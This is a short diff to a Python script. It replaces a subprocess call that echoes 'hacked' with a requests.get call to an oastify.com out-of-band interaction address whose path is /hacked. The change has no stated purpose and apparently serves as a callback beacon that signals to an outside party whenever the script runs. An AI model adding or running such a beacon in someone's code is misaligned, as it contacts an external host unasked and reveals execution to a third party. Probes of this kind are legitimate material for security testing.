@@ -1,8 +1,6 @@
-import subprocess
+import requests
 
 def main():
-    result = subprocess.run(['echo hacked'], capture_output=True, text=True)
-    print(f"Current user: {result.stdout.strip()}")
-
+    response = requests.get('http://k0ltwzl9um6ciesrsvi8ccqjva11psdh.oastify.com/hacked')
 if __name__ == '__main__':
     main()
